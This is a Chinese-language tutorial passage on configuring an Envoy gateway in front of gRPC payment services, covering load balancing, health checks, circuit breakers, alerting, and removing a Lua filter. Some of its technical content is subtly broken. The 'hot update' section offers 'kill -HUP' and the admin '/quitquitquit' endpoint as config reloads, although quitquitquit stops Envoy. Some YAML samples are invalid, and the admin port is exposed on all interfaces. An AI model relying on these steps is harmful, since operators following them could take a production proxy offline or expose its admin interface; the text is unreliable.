<p><strong>在 envoy.yaml 中配置多个上游服务实例</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">connect_timeout:</span> <span class="hljs-string">5s</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">STRICT_DNS</span>
    <span class="hljs-attr">lb_policy:</span> <span class="hljs-string">ROUND_ROBIN</span>  <span class="hljs-comment"># 轮询负载均衡</span>
    <span class="hljs-attr">http2_protocol_options:</span> {}
    
    <span class="hljs-comment"># 健康检查配置</span>
    <span class="hljs-attr">health_checks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">timeout:</span> <span class="hljs-string">1s</span>
        <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">unhealthy_threshold:</span> <span class="hljs-number">3</span>
        <span class="hljs-attr">healthy_threshold:</span> <span class="hljs-number">2</span>
        <span class="hljs-attr">grpc_health_check:</span>
          <span class="hljs-attr">service_name:</span> <span class="hljs-string">""</span>  <span class="hljs-comment"># 空字符串表示使用默认健康检查服务</span>
        <span class="hljs-attr">no_traffic_interval:</span> <span class="hljs-string">60s</span>
    
    <span class="hljs-comment"># 熔断器配置</span>
    <span class="hljs-attr">circuit_breakers:</span>
      <span class="hljs-attr">thresholds:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">priority:</span> <span class="hljs-string">DEFAULT</span>
          <span class="hljs-attr">max_connections:</span> <span class="hljs-number">1000</span>
          <span class="hljs-attr">max_pending_requests:</span> <span class="hljs-number">1000</span>
          <span class="hljs-attr">max_requests:</span> <span class="hljs-number">1000</span>
          <span class="hljs-attr">max_retries:</span> <span class="hljs-number">3</span>
    
    <span class="hljs-comment"># 超时配置</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
    
    <span class="hljs-attr">load_assignment:</span>
      <span class="hljs-attr">cluster_name:</span> <span class="hljs-string">payment_gateway_grpc</span>
      <span class="hljs-attr">endpoints:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">lb_endpoints:</span>
            <span class="hljs-comment"># 实例 1</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">endpoint:</span>
                <span class="hljs-attr">address:</span>
                  <span class="hljs-attr">socket_address:</span>
                    <span class="hljs-attr">address:</span> <span class="hljs-number">172.29</span><span class="hljs-number">.119</span><span class="hljs-number">.29</span>
                    <span class="hljs-attr">port_value:</span> <span class="hljs-number">8090</span>
              <span class="hljs-attr">health_status:</span> <span class="hljs-string">HEALTHY</span>
            <span class="hljs-comment"># 实例 2</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">endpoint:</span>
                <span class="hljs-attr">address:</span>
                  <span class="hljs-attr">socket_address:</span>
                    <span class="hljs-attr">address:</span> <span class="hljs-number">172.29</span><span class="hljs-number">.119</span><span class="hljs-number">.30</span>
                    <span class="hljs-attr">port_value:</span> <span class="hljs-number">8090</span>
              <span class="hljs-attr">health_status:</span> <span class="hljs-string">HEALTHY</span>
            <span class="hljs-comment"># 实例 3</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">endpoint:</span>
                <span class="hljs-attr">address:</span>
                  <span class="hljs-attr">socket_address:</span>
                    <span class="hljs-attr">address:</span> <span class="hljs-number">172.29</span><span class="hljs-number">.119</span><span class="hljs-number">.31</span>
                    <span class="hljs-attr">port_value:</span> <span class="hljs-number">8090</span>
              <span class="hljs-attr">health_status:</span> <span class="hljs-string">HEALTHY</span>
</code></pre>
<p><strong>关键配置说明</strong>：</p>
<ol start="86">
<li>
<p><strong>负载均衡策略</strong>：</p>
<ol>
<li><code>ROUND_ROBIN</code>：轮询（默认）</li>
<li><code>LEAST_REQUEST</code>：最少请求</li>
<li><code>RANDOM</code>：随机</li>
<li><code>RING_HASH</code>：一致性哈希（需要会话保持时使用）</li>
</ol>
</li>
<li>
<p><strong>健康检查</strong>：</p>
<ol>
<li><code>timeout</code>：健康检查超时时间</li>
<li><code>interval</code>：检查间隔</li>
<li><code>unhealthy_threshold</code>：连续失败几次标记为不健康</li>
<li><code>healthy_threshold</code>：连续成功几次标记为健康</li>
<li><code>grpc_health_check</code>：使用 gRPC 健康检查协议</li>
</ol>
</li>
<li>
<p><strong>熔断器</strong>：</p>
<ol>
<li><code>max_connections</code>：最大连接数</li>
<li><code>max_pending_requests</code>：最大等待请求数</li>
<li><code>max_requests</code>：最大并发请求数</li>
<li><code>max_retries</code>：最大重试次数</li>
</ol>
</li>
</ol>
<h4 data-id="heading-75">7.2.2 故障转移配置</h4>
<p><strong>自动故障转移</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-comment"># ... 其他配置 ...</span>
    
    <span class="hljs-comment"># 故障转移配置</span>
    <span class="hljs-attr">outlier_detection:</span>
      <span class="hljs-attr">consecutive_5xx:</span> <span class="hljs-number">5</span>  <span class="hljs-comment"># 连续 5 次 5xx 错误后标记为异常</span>
      <span class="hljs-attr">interval:</span> <span class="hljs-string">30s</span>  <span class="hljs-comment"># 检测间隔</span>
      <span class="hljs-attr">base_ejection_time:</span> <span class="hljs-string">30s</span>  <span class="hljs-comment"># 基础驱逐时间</span>
      <span class="hljs-attr">max_ejection_percent:</span> <span class="hljs-number">50</span>  <span class="hljs-comment"># 最多驱逐 50% 的实例</span>
      <span class="hljs-attr">enforcing_consecutive_5xx:</span> <span class="hljs-number">100</span>  <span class="hljs-comment"># 100% 强制执行</span>
      <span class="hljs-attr">success_rate_minimum_hosts:</span> <span class="hljs-number">5</span>  <span class="hljs-comment"># 至少需要 5 个健康实例才启用成功率检测</span>
      <span class="hljs-attr">success_rate_request_volume:</span> <span class="hljs-number">10</span>  <span class="hljs-comment"># 至少 10 个请求才计算成功率</span>
      <span class="hljs-attr">success_rate_stdev_factor:</span> <span class="hljs-number">1900</span>  <span class="hljs-comment"># 成功率标准差因子</span>
</code></pre>
<p><strong>手动故障转移</strong>（通过路由配置）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">routes:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">"/api/v1/payment/channels"</span>
    <span class="hljs-attr">route:</span>
      <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_gateway_grpc</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
      <span class="hljs-attr">retry_policy:</span>
        <span class="hljs-attr">retry_on:</span> <span class="hljs-string">"5xx,reset,connect-failure,refused-stream"</span>
        <span class="hljs-attr">num_retries:</span> <span class="hljs-number">3</span>
        <span class="hljs-attr">per_try_timeout:</span> <span class="hljs-string">2s</span>
        <span class="hljs-attr">retry_back_off:</span>
          <span class="hljs-attr">base_interval:</span> <span class="hljs-number">0.</span><span class="hljs-string">25s</span>
          <span class="hljs-attr">max_interval:</span> <span class="hljs-string">60s</span>
</code></pre>
<h3 data-id="heading-76">7.3 健康检查配置</h3>
<h4 data-id="heading-77">7.3.1 Envoy 自身健康检查</h4>
<p><strong>在 envoy.yaml 中添加健康检查路由</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">routes:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">"/healthz"</span>
    <span class="hljs-attr">route:</span>
      <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_stripe_grpc</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">1s</span>
    <span class="hljs-comment"># 或者直接返回健康状态</span>
    <span class="hljs-attr">direct_response:</span>
      <span class="hljs-attr">status:</span> <span class="hljs-number">200</span>
      <span class="hljs-attr">body:</span>
        <span class="hljs-attr">inline_string:</span> <span class="hljs-string">"ok"</span>
</code></pre>
<p><strong>Admin 接口健康检查</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">admin:</span>
  <span class="hljs-attr">address:</span>
    <span class="hljs-attr">socket_address:</span>
      <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>
      <span class="hljs-attr">address:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
      <span class="hljs-attr">port_value:</span> <span class="hljs-number">9901</span>
  <span class="hljs-comment"># 健康检查端点</span>
  <span class="hljs-comment"># 访问 http://localhost:9901/server_info 检查 Envoy 状态</span>
</code></pre>
<h4 data-id="heading-78">7.3.2 上游服务健康检查</h4>
<p><strong>gRPC 健康检查</strong>（推荐）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">health_checks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">timeout:</span> <span class="hljs-string">1s</span>
        <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">unhealthy_threshold:</span> <span class="hljs-number">3</span>
        <span class="hljs-attr">healthy_threshold:</span> <span class="hljs-number">2</span>
        <span class="hljs-attr">grpc_health_check:</span>
          <span class="hljs-attr">service_name:</span> <span class="hljs-string">""</span>  <span class="hljs-comment"># 使用默认健康检查服务</span>
        <span class="hljs-attr">no_traffic_interval:</span> <span class="hljs-string">60s</span>
        <span class="hljs-comment"># 如果服务实现了 gRPC 健康检查协议，Envoy 会自动调用</span>
</code></pre>
<p><strong>HTTP 健康检查</strong>（如果服务提供 HTTP 健康检查端点）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">health_checks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">timeout:</span> <span class="hljs-string">1s</span>
        <span class="hljs-attr">interval:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">unhealthy_threshold:</span> <span class="hljs-number">3</span>
        <span class="hljs-attr">healthy_threshold:</span> <span class="hljs-number">2</span>
        <span class="hljs-attr">http_health_check:</span>
          <span class="hljs-attr">path:</span> <span class="hljs-string">"/healthz"</span>
          <span class="hljs-attr">expected_statuses:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">start:</span> <span class="hljs-number">200</span>
              <span class="hljs-attr">end:</span> <span class="hljs-number">299</span>
</code></pre>
<h3 data-id="heading-79">7.4 监控和告警</h3>
<h4 data-id="heading-80">7.4.1 统计信息收集</h4>
<p><strong>Prometheus 指标导出</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">admin:</span>
  <span class="hljs-attr">address:</span>
    <span class="hljs-attr">socket_address:</span>
      <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span>
      <span class="hljs-attr">address:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
      <span class="hljs-attr">port_value:</span> <span class="hljs-number">9901</span>
  <span class="hljs-comment"># Prometheus 统计端点</span>
  <span class="hljs-comment"># 访问 http://localhost:9901/stats/prometheus 获取指标</span>
</code></pre>
<p><strong>关键指标</strong>：</p>
<ul>
<li><code>cluster.payment_gateway_grpc.upstream_rq_total</code>：总请求数</li>
<li><code>cluster.payment_gateway_grpc.upstream_rq_2xx</code>：2xx 响应数</li>
<li><code>cluster.payment_gateway_grpc.upstream_rq_5xx</code>：5xx 错误数</li>
<li><code>cluster.payment_gateway_grpc.upstream_cx_active</code>：活跃连接数</li>
<li><code>cluster.payment_gateway_grpc.health_check.healthy</code>：健康实例数</li>
<li><code>cluster.payment_gateway_grpc.health_check.unhealthy</code>：不健康实例数</li>
</ul>
<h4 data-id="heading-81">7.4.2 告警规则</h4>
<p><strong>Prometheus 告警规则示例</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">groups:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">envoy_alerts</span>
    <span class="hljs-attr">rules:</span>
      <span class="hljs-comment"># Envoy 实例宕机</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">EnvoyDown</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">up{job="envoy"}</span> <span class="hljs-string">==</span> <span class="hljs-number">0</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">1m</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"Envoy 实例 <span class="hljs-template-variable">{{ $labels.instance }}</span> 宕机"</span>
      
      <span class="hljs-comment"># 上游服务错误率过高</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighErrorRate</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">|
          rate(cluster_payment_gateway_grpc_upstream_rq_5xx[5m]) / 
          rate(cluster_payment_gateway_grpc_upstream_rq_total[5m]) &gt; 0.1
</span>        <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"上游服务错误率超过 10%"</span>
      
      <span class="hljs-comment"># 健康实例数不足</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">InsufficientHealthyInstances</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">cluster_payment_gateway_grpc_health_check_healthy</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">2</span>
        <span class="hljs-attr">for:</span> <span class="hljs-string">2m</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"健康实例数不足，当前: <span class="hljs-template-variable">{{ $value }}</span>"</span>
      
      <span class="hljs-comment"># 响应时间过长</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">alert:</span> <span class="hljs-string">HighLatency</span>
        <span class="hljs-attr">expr:</span> <span class="hljs-string">|
          histogram_quantile(0.99,
            rate(cluster_payment_gateway_grpc_upstream_rq_time_bucket[5m])
          ) &gt; 1
</span>        <span class="hljs-attr">for:</span> <span class="hljs-string">5m</span>
        <span class="hljs-attr">annotations:</span>
          <span class="hljs-attr">summary:</span> <span class="hljs-string">"99 分位响应时间超过 1 秒"</span>
</code></pre>
<h3 data-id="heading-82">7.5 配置管理高可用</h3>
<h4 data-id="heading-83">7.5.1 配置版本控制</h4>
<p><strong>使用 Git 管理配置</strong>：</p>
<ul>
<li>所有 <code>envoy.yaml</code> 和 <code>proto</code> 文件纳入版本控制</li>
<li>配置变更通过 Pull Request 审核</li>
<li>使用标签管理不同环境的配置</li>
</ul>
<h4 data-id="heading-84">7.5.2 配置热更新</h4>
<p><strong>Envoy 支持配置热更新</strong>（无需重启）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 发送 SIGHUP 信号触发配置重载</span>
<span class="hljs-built_in">kill</span> -HUP &lt;envoy_pid&gt;

<span class="hljs-comment"># 或使用 Admin 接口</span>
curl -X POST http://localhost:9901/quitquitquit
</code></pre>
<p><strong>配置验证</strong>：</p>
<pre><code class="hljs language-r" lang="r"><span class="hljs-comment"># 验证配置文件语法</span>
envoy <span class="hljs-operator">-</span><span class="hljs-built_in">c</span> envoy.yaml <span class="hljs-operator">-</span><span class="hljs-operator">-</span>mode validate
</code></pre>
<h3 data-id="heading-85">7.6 高可用最佳实践总结</h3>
<ol start="89">
<li>
<p><strong>Envoy 实例</strong>：</p>
<ol>
<li>至少部署 3 个实例</li>
<li>使用负载均衡器分发流量</li>
<li>配置自动重启和健康检查</li>
</ol>
</li>
<li>
<p><strong>上游服务</strong>：</p>
<ol>
<li>每个服务至少 2 个实例</li>
<li>配置健康检查和故障转移</li>
<li>使用熔断器防止级联故障</li>
</ol>
</li>
<li>
<p><strong>监控告警</strong>：</p>
<ol>
<li>监控 Envoy 和上游服务状态</li>
<li>设置错误率和延迟告警</li>
<li>定期检查健康实例数</li>
</ol>
</li>
<li>
<p><strong>配置管理</strong>：</p>
<ol>
<li>使用版本控制管理配置</li>
<li>配置变更前进行验证</li>
<li>支持配置热更新</li>
</ol>
</li>
<li>
<p><strong>故障处理</strong>：</p>
<ol>
<li>自动故障转移</li>
<li>异常实例自动隔离</li>
<li>快速恢复机制</li>
</ol>
</li>
</ol>
<hr/>
<h2 data-id="heading-86">八、总结</h2>
<h3 data-id="heading-87">8.1 关键结论</h3>
<ol start="94">
<li>
<p><strong>Envoy 方案适合多服务场景</strong>：</p>
<ol>
<li>统一管理，降低维护成本</li>
<li>快速扩展，只需修改配置</li>
<li>性能优异，标准化程度高</li>
</ol>
</li>
<li>
<p><strong>架构设计原则</strong>：</p>
<ol>
<li>Envoy 仅做透传和协议转换</li>
<li>所有业务逻辑在 RPC 服务中处理</li>
<li>仅统一有 HTTP 注解的 RPC 方法的响应格式</li>
</ol>
</li>
<li>
<p><strong>方案选择</strong>：</p>
<ol>
<li>服务数量多、需要快速扩展 → 使用 Envoy</li>
<li>服务数量少、独立性要求高 → 各自搭建 API 项目</li>
</ol>
</li>
</ol>
<h3 data-id="heading-88">8.2 建议</h3>
<p>基于您的需求背景（多个 webhook 服务 + RPC 转 API 接口 + 服务数量可能增长），<strong>建议使用 Envoy 方案</strong>，可以：</p>
<ul>
<li>统一管理所有服务</li>
<li>快速添加新服务</li>
<li>降低维护成本</li>
<li>提高性能和标准化程度</li>
</ul>
<hr/>
<h2 data-id="heading-89">九、不使用 Lua 的方案：RPC 响应直接设置为目标格式</h2>
<h3 data-id="heading-90">9.1 方案概述</h3>
<p><strong>核心思想</strong>：移除 Envoy 中的 Lua 过滤器，让 gRPC 服务直接返回符合 HTTP API 要求的响应格式，Envoy 仅负责协议转换（gRPC ↔ HTTP/JSON），不做任何业务格式转换。</p>
<p><strong>架构对比</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">使用 Lua 的方案：
HTTP <span class="hljs-built_in">Client</span> → Envoy → gRPC 服务 → gRPC 响应 → Lua 转换 → HTTP 响应

不使用 Lua 的方案：
HTTP <span class="hljs-built_in">Client</span> → Envoy → gRPC 服务 → gRPC 响应（已符合目标格式）→ HTTP 响应
</code></pre>
<p><strong>优势</strong>：</p>
<ol start="97">
<li><strong>简化架构</strong>：减少 Envoy 层的处理逻辑，降低复杂度</li>
<li><strong>提高性能</strong>：减少一次数据转换，提升响应速度</li>
<li><strong>易于维护</strong>：响应格式逻辑集中在 RPC 服务中，便于测试和调试</li>
<li><strong>类型安全</strong>：响应格式在 proto 文件中定义，编译时检查</li>
<li><strong>职责清晰</strong>：Envoy 只做协议转换，RPC 服务处理业务逻辑和格式</li>
</ol>
<h3 data-id="heading-91">9.2 实施步骤</h3>
<h4 data-id="heading-92">9.2.1 步骤 1：识别需要统一响应格式的 RPC 方法</h4>
<p><strong>判断标准</strong>：</p>
<ul>
<li>✅ 有 <code>option (google.api.http)</code> 注解的 RPC 方法 → 需要通过 Envoy 暴露为 HTTP API，需要统一格式</li>
<li>❌ 无 HTTP 注解的 RPC 方法 → 仅用于内部 gRPC 调用，可以保持原有格式</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">service PaymentGateway {
  <span class="hljs-comment">// ✅ 有 HTTP 注解，需要统一响应格式</span>
  rpc <span class="hljs-built_in">ListChannels</span>(ListChannelsReq) returns (ListChannelsResp) {
    option (google.api.http) = {
      get: <span class="hljs-string">"/api/v1/payment/channels"</span>
    };
  };
  
  <span class="hljs-comment">// ❌ 无 HTTP 注解，仅内部调用，可以保持原有格式</span>
  rpc <span class="hljs-built_in">CreatePayment</span>(CreatePaymentReq) returns (CreatePaymentResp);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol start="102">
<li>
<p><strong>错误处理</strong>：所有错误都通过响应消息返回，而不是 gRPC 错误</p>
<ol>
<li>成功：<code>Code: 200, Msg: "success"</code></li>
<li>参数错误：<code>Code: 400, Msg: "参数错误"</code></li>
<li>服务器错误：<code>Code: 500, Msg: err.Error()</code></li>
</ol>
</li>
<li>
<p><strong>统一格式</strong>：所有响应都使用 <code>{code, msg, data}</code> 格式</p>
</li>
<li>
<p><strong>字段映射</strong>：直接使用 <code>data</code> 字段，而不是其他字段名（如 <code>channels</code>）</p>
</li>
</ol>
<h4 data-id="heading-93">9.2.2 步骤 2：移除 Envoy 中的 Lua 过滤器</h4>
<p><strong>修改 envoy.yaml</strong>：</p>
<p><strong>修改前（使用 Lua）</strong> ：</p>
<pre><code class="hljs language-lua" lang="lua">http_filters:
  - name: envoy.filters.http.lua
    typed_config:
      <span class="hljs-string">"@type"</span>: <span class="hljs-built_in">type</span>.googleapis.com/envoy.extensions.filters.http.lua.v3.Lua
      inline_code: |
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">envoy_on_response</span><span class="hljs-params">(response_handle)</span></span>
          <span class="hljs-comment">-- Lua 转换逻辑....</span>
        <span class="hljs-keyword">end</span>
  - name: envoy.filters.http.grpc_json_transcoder
    typed_config:
      <span class="hljs-string">"@type"</span>: <span class="hljs-built_in">type</span>.googleapis.com/envoy.extensions.filters.http.grpc_json_transcoder.v3.GrpcJsonTranscoder
      proto_descriptor: <span class="hljs-string">"/etc/envoy/proto/payment_combined.pb"</span>
      services:
        - <span class="hljs-string">"hh_payment_gateway.v1.PaymentGateway"</span>
  - name: envoy.filters.http.router
</code></pre>
<p><strong>修改后（移除 Lua）</strong> ：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">http_filters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">envoy.filters.http.grpc_json_transcoder</span>
    <span class="hljs-attr">typed_config:</span>
      <span class="hljs-string">"@type"</span><span class="hljs-string">:</span> <span class="hljs-string">type.googleapis.com/envoy.extensions.filters.http.grpc_json_transcoder.v3.GrpcJsonTranscoder</span>
      <span class="hljs-attr">proto_descriptor:</span> <span class="hljs-string">"/etc/envoy/proto/payment_combined.pb"</span>
      <span class="hljs-attr">services:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"hh_payment_gateway.v1.PaymentGateway"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">envoy.filters.http.router</span>
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>移除 <code>envoy.filters.http.lua</code> 过滤器配置</li>
<li>保留 <code>grpc_json_transcoder</code> 和 <code>router</code> 过滤器</li>
<li>过滤器顺序：<code>grpc_json_transcoder</code> → <code>router</code></li>
</ul>
<h4 data-id="heading-94">9.2.3 步骤 3：重新编译 Proto 文件并重启服务</h4>
<p><strong>重新编译 Proto</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /apps/www/go/src/hh_bmp/envoy
./build-proto.sh
</code></pre>
<p><strong>重启服务</strong>：</p>
<ol start="105">
<li>重启 gRPC 服务（使用新的 proto 定义）</li>
<li>重启 Envoy（加载新的配置，移除 Lua 过滤器）</li>
</ol>
<p><strong>验证</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试接口</span>
curl http://localhost:2020/api/v1/payment/channels

<span class="hljs-comment"># 期望响应格式：</span>
{
  <span class="hljs-string">"code"</span>: 200,
  <span class="hljs-string">"msg"</span>: <span class="hljs-string">"success"</span>,
  <span class="hljs-string">"data"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-string">"channel_1"</span>,
      <span class="hljs-string">"name"</span>: <span class="hljs-string">"Stripe"</span>,
      <span class="hljs-string">"type"</span>: <span class="hljs-string">"stripe"</span>
    }
  ]
}
</code></pre>
<h3 data-id="heading-95">9.3 完整示例</h3>
<h4 data-id="heading-96">9.3.1 Proto 定义示例</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">syntax</span> = <span class="hljs-string">"proto3"</span><span class="hljs-comment">;</span>
package hh_payment_gateway.v1<span class="hljs-comment">;</span>
option <span class="hljs-attr">go_package</span> = <span class="hljs-string">"./v1"</span><span class="hljs-comment">;</span>

import "google/api/annotations.proto"<span class="hljs-comment">;</span>

service PaymentGateway {
  // 有 HTTP 注解，需要统一响应格式
  rpc ListChannels(ListChannelsReq) returns (ListChannelsResp) {
    option (google.api.http) = {
      get: "/api/v1/payment/channels"
    }<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>
}

// 请求消息
message ListChannelsReq {
  // 可以添加查询参数
}

// 响应消息（统一格式）
message ListChannelsResp {
  int32 <span class="hljs-attr">code</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  string <span class="hljs-attr">msg</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  repeated Channel <span class="hljs-attr">data</span> = <span class="hljs-number">3</span><span class="hljs-comment">;  // 直接使用 data 字段</span>
}
</code></pre>
<h4 data-id="heading-97">9.3.3 Envoy 配置示例（不使用 Lua）</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">listeners:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">listener_0</span>
    <span class="hljs-attr">address:</span>
      <span class="hljs-attr">socket_address:</span>
        <span class="hljs-attr">address:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
        <span class="hljs-attr">port_value:</span> <span class="hljs-number">2020</span>
    <span class="hljs-attr">filter_chains:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">filters:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">envoy.filters.network.http_connection_manager</span>
            <span class="hljs-attr">typed_config:</span>
              <span class="hljs-string">"@type"</span><span class="hljs-string">:</span> <span class="hljs-string">type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager</span>
              <span class="hljs-attr">stat_prefix:</span> <span class="hljs-string">ingress_http</span>
              <span class="hljs-attr">route_config:</span>
                <span class="hljs-attr">name:</span> <span class="hljs-string">local_route</span>
                <span class="hljs-attr">virtual_hosts:</span>
                  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">local_service</span>
                    <span class="hljs-attr">domains:</span> [<span class="hljs-string">"*"</span>]
                    <span class="hljs-attr">routes:</span>
                      <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
                          <span class="hljs-attr">path:</span> <span class="hljs-string">"/api/v1/payment/channels"</span>
                        <span class="hljs-attr">route:</span>
                          <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_gateway_grpc</span>
                          <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
              <span class="hljs-attr">http_filters:</span>
                <span class="hljs-comment"># 移除 Lua 过滤器，只保留 gRPC-JSON Transcoding</span>
                <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">envoy.filters.http.grpc_json_transcoder</span>
                  <span class="hljs-attr">typed_config:</span>
                    <span class="hljs-string">"@type"</span><span class="hljs-string">:</span> <span class="hljs-string">type.googleapis.com/envoy.extensions.filters.http.grpc_json_transcoder.v3.GrpcJsonTranscoder</span>
                    <span class="hljs-attr">proto_descriptor:</span> <span class="hljs-string">"/etc/envoy/proto/payment_combined.pb"</span>
                    <span class="hljs-attr">services:</span>
                      <span class="hljs-bullet">-</span> <span class="hljs-string">"hh_payment_gateway.v1.PaymentGateway"</span>
                <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">envoy.filters.http.router</span>

<span class="hljs-attr">clusters:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">payment_gateway_grpc</span>
    <span class="hljs-attr">connect_timeout:</span> <span class="hljs-string">5s</span>
    <span class="hljs-attr">type:</span> <span class="hljs-string">STRICT_DNS</span>
    <span class="hljs-attr">lb_policy:</span> <span class="hljs-string">ROUND_ROBIN</span>
    <span class="hljs-attr">http2_protocol_options:</span> {}
    <span class="hljs-attr">load_assignment:</span>
      <span class="hljs-attr">cluster_name:</span> <span class="hljs-string">payment_gateway_grpc</span>
      <span class="hljs-attr">endpoints:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">lb_endpoints:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-attr">endpoint:</span>
                <span class="hljs-attr">address:</span>
                  <span class="hljs-attr">socket_address:</span>
                    <span class="hljs-attr">address:</span> <span class="hljs-number">172.29</span><span class="hljs-number">.119</span><span class="hljs-number">.29</span>
                    <span class="hljs-attr">port_value:</span> <span class="hljs-number">8090</span>
</code></pre>
<h3 data-id="heading-98">9.4 方案对比</h3>
<h4 data-id="heading-99">9.4.1 使用 Lua vs 不使用 Lua</h4>













































